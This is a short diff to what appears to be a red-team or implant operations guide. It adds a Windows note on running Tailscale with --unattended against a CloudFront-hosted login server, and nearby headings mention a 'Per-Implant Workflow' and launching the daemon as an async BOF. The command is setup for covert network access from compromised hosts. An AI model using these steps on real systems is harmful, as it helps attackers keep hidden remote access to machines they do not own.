@@ -36,6 +36,12 @@ sudo ./tailscale up \
     --auth-key tskey-auth-...
 ```
 
+**Windows note:** On Windows builds, the Tailscale tray application normally keeps the LocalAPI pipe open. Without `--unattended`, each time the GUI disconnects, `tailscaled` assumes logout and zeros the private key. Use `--unattended` to run standalone:
+
+```
+.\tailscale --unattended up --login-server https://d1a2b3c4e5f6g7.cloudfront.net --auth-key tskey-auth-...
+```
+
 ### 3. Per-Implant Workflow
 
 Start the daemon as an async BOF:
